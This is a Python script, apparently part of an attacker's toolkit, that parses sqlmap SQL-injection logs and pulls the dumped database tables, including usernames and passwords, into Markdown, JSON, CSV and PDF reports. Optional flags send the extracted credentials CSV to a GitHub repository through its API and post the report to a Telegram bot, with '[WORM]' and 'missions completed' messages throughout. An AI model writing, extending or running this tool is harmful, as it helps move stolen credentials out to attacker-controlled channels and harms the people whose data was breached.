#!/usr/bin/env python3
import re, json, os, sys, csv, base64, requests, argparse, shutil, glob, subprocess
from datetime import datetime

class SQLiLogParser:
    def __init__(self, log_path):
        self.raw = open(log_path, encoding='utf-8', errors='ignore').read()
        self.data = {"dbms": "Unknown", "param": None, "tables": {}}
        self.parse()

    def parse(self):
        m = re.search(r'back-end DBMS(?:\s+is|\s*:)\s*([^\n]+)', self.raw)
        if m: self.data["dbms"] = m.group(1).strip()
        m = re.search(r'Parameter:\s*([\w]+)\s*\(GET\)', self.raw)
        if m: self.data["param"] = m.group(1)

        parts = re.split(r'Table:\s*(\w+)', self.raw)
        for i in range(1, len(parts), 2):
            table_name = parts[i]
            table_body = parts[i+1] if i+1 < len(parts) else ""
            cols = []
            header_match = re.search(r'\+----\+([\s\S]+?)\+----\+', table_body)
            if header_match:
                header_line = header_match.group(1).strip()
                candidates = [c.strip() for c in header_line.split('|') if c.strip()]
                cols = [c for c in candidates if c.isalpha() and len(c) > 1]
                if not cols: cols = ["id", "password", "username"]
            rows = []
            row_matches = re.findall(r'\|\s*([^|]+?)\s*\|\s*([^|]+?)\s*\|\s*([^|]+?)\s*\|', table_body)
            for r in row_matches:
                if r[0].strip().isdigit():
                    rows.append({
                        cols[0] if len(cols) > 0 else "col1": r[0].strip(),
                        cols[1] if len(cols) > 1 else "col2": r[1].strip(),
                        cols[2] if len(cols) > 2 else "col3": r[2].strip()
                    })
            if rows:
                self.data["tables"][table_name] = {"columns": cols, "rows": rows}

    def save(self, outdir="forensics_out"):
        os.makedirs(outdir, exist_ok=True)
        md_path = f"{outdir}/REPORT.md"
        json_path = f"{outdir}/report.json"
        csv_path = f"{outdir}/extracted_creds.csv"

        # توليد Markdown
        with open(md_path, "w", encoding='utf-8') as f:
            f.write(f"# SQLMap Report\n**DBMS:** {self.data['dbms']}\n**Param:** {self.data['param']}\n\n")
            for tbl, info in self.data["tables"].items():
                f.write(f"## Table: {tbl}\nColumns: {', '.join(info['columns'])}\n\n")
                f.write("| " + " | ".join(info['columns']) + " |\n")
                f.write("|" + "---|" * len(info['columns']) + "\n")
                for row in info['rows']:
                    f.write("| " + " | ".join(row.values()) + " |\n")
                f.write("\n")

        # توليد JSON (خيار 3)
        with open(json_path, "w", encoding='utf-8') as f:
            json.dump(self.data, f, indent=2, ensure_ascii=False)

        # توليد CSV
        all_rows = []
        for tbl, info in self.data["tables"].items():
            for row in info['rows']:
                rd = {"table": tbl}; rd.update(row); all_rows.append(rd)
        if all_rows:
            fieldnames = ["table"] + [k for k in all_rows[0].keys() if k != "table"]
            with open(csv_path, "w", newline="", encoding='utf-8') as csvfile:
                w = csv.DictWriter(csvfile, fieldnames=fieldnames)
                w.writeheader(); w.writerows(all_rows)

        # توليد PDF باستخدام pandoc (إذا كان موجوداً)
        pdf_path = f"{outdir}/REPORT.pdf"
        try:
            subprocess.run(["pandoc", md_path, "-o", pdf_path], check=True, capture_output=True)
            print(f"[WORM] ✅ PDF generated: {pdf_path}")
        except (FileNotFoundError, subprocess.CalledProcessError):
            print("[WORM] ⚠️ pandoc not installed. Skipping PDF. (Install with: apt install pandoc)")

        print(f"[WORM] ✅ Saved to {outdir}/ (MD, JSON, CSV)")
        return outdir

    def push_to_github(self, outdir, repo="anadkkkkkkkk/-AWR", branch="main"):
        token = os.environ.get("GITHUB_TOKEN")
        if not token: print("[WORM] ⚠️ GITHUB_TOKEN missing."); return False
        csv_path = f"{outdir}/extracted_creds.csv"
        if not os.path.exists(csv_path): return False
        url = f"https://api.github.com/repos/{repo}/contents/{os.path.basename(csv_path)}"
        headers = {"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"}
        sha = None
        try:
            resp = requests.get(url, headers=headers)
            if resp.status_code == 200: sha = resp.json().get("sha")
        except: pass
        with open(csv_path, 'rb') as f: content = base64.b64encode(f.read()).decode('utf-8')
        data = {"message": f"Auto SQLi dump {datetime.now().date()}", "content": content, "branch": branch}
        if sha: data["sha"] = sha
        try:
            r = requests.put(url, headers=headers, json=data)
            if r.status_code in [200, 201]: print(f"[WORM] ✅ Pushed to GitHub: {repo}"); return True
            else: print(f"[WORM] ❌ Push failed: {r.status_code}"); return False
        except Exception as e: print(f"[WORM] ❌ Error: {e}"); return False

    def send_to_telegram(self, outdir):
        token = os.environ.get("TELEGRAM_BOT_TOKEN")
        chat_id = os.environ.get("TELEGRAM_CHAT_ID")
        if not token or not chat_id: print("[WORM] ⚠️ Telegram vars missing."); return False
        report_path = f"{outdir}/REPORT.md"
        if not os.path.exists(report_path): return False
        with open(report_path, 'r') as f: text = f.read()
        if len(text) > 4000: text = text[:3500] + "\n... (مقتطع)"
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        try:
            r = requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
            if r.status_code == 200: print("[WORM] ✅ Report sent to Telegram."); return True
            else: print(f"[WORM] ❌ Telegram error: {r.text}"); return False
        except Exception as e: print(f"[WORM] ❌ Exception: {e}"); return False

def find_log_files():
    patterns = ['*.log', '*.txt', '*.out']
    candidates = []
    for p in patterns: candidates.extend(glob.glob(p))
    valid = []
    for f in candidates:
        try:
            with open(f, 'r', encoding='utf-8', errors='ignore') as fp:
                if 'sqlmap' in fp.read(1000).lower() or 'back-end DBMS' in fp.read(1000) or 'Table:' in fp.read(1000):
                    valid.append(f)
        except: continue
    return valid

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("logfile", nargs='?', help="Path to log file")
    parser.add_argument("--push", action="store_true")
    parser.add_argument("--telegram", action="store_true")
    parser.add_argument("--clean", action="store_true")
    args = parser.parse_args()

    log_files = []
    if args.logfile:
        if os.path.exists(args.logfile): log_files = [args.logfile]
        else: print(f"[ERROR] File not found."); sys.exit(1)
    else:
        print("[WORM] 🔍 Auto-search...")
        log_files = find_log_files()
        if not log_files: print("[WORM] ❌ No logs found."); sys.exit(1)

    for log_file in log_files:
        print(f"\n[WORM] 📄 Processing: {log_file}")
        p = SQLiLogParser(log_file)
        print(json.dumps(p.data, indent=2, ensure_ascii=False))
        out_dir = f"forensics_{os.path.splitext(os.path.basename(log_file))[0]}"
        out = p.save(outdir=out_dir)
        if args.push: p.push_to_github(out)
        if args.telegram: p.send_to_telegram(out)
        if args.clean: shutil.rmtree(out); print(f"[WORM] 🧹 Cleaned {out}/")
    print("\n[WORM] 💀 All missions completed.")
